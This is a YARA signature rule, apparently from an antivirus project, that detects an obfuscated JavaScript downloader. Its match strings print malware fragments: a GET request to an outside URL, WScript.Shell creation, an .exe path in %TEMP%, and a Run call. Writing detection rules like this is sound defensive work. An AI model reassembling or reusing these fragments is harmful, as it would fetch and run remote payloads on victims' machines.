rule sig_20160401_9dbab32257b831acc257cb90088706df {
  meta:
    description = "datamaliciousorder - file 20160401_9dbab32257b831acc257cb90088706df.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bbc377c2aa0b900fc15191690693ae2a086de78e3648af739f8c6013073789de"

  strings:
    $s1  = "OzuXf[RjIeg](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "function ChvUnz(OsBdl, RlXs){LvoEie = LvoEie * 1; return OsBdl - RlXs;};" fullword ascii
    $s3  = "var GvLkp = function XtFsp() {return WScript[HksAnd](\"WScript\"+\".Shell\");}(), BvYqy = 11;" fullword ascii
    $s4  = "if (OzuXf[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function KtBq() {return GvLkp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"n9Bdk5mAe6.ex\" + \"e\";};" fullword ascii
    $s6  = "function OzGu(){return KrhEmh + \"\";};" fullword ascii
    $s7  = "function RydJwo() {return ((TcZg == true) && (TcZg == WacMsl)) ? 1 : LvoEie;};" fullword ascii
    $s8  = "function RakTno(YgYpc){GvLkp[\"R\"+\"un\"](YgYpc, LvoEie, LvoEie);};" fullword ascii
    $s9  = "return ChvUnz(EslGlt, HzpIz);" fullword ascii
    $s10 = "var WacMsl = false;" fullword ascii
    $s11 = "function FeePk(){return 23;};" fullword ascii
    $s12 = "var TzVc = new this[\"Date\"]();" fullword ascii
    $s13 = "var TcZg = false;" fullword ascii
    $s14 = "function ZloPlz()" fullword ascii
    $s15 = "TcZg = true; " fullword ascii
    $s16 = "function GmtHbp(NwpJq) {var PeDhw = (1, 2, 3, 4, 5, NwpJq); return PeDhw;};" fullword ascii
    $s17 = "}while (MzxGkx);" fullword ascii
    $s18 = "function UwTe(){return HksAnd;};" fullword ascii
    $s19 = "WacMsl = true; " fullword ascii
    $s20 = "var YaUh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}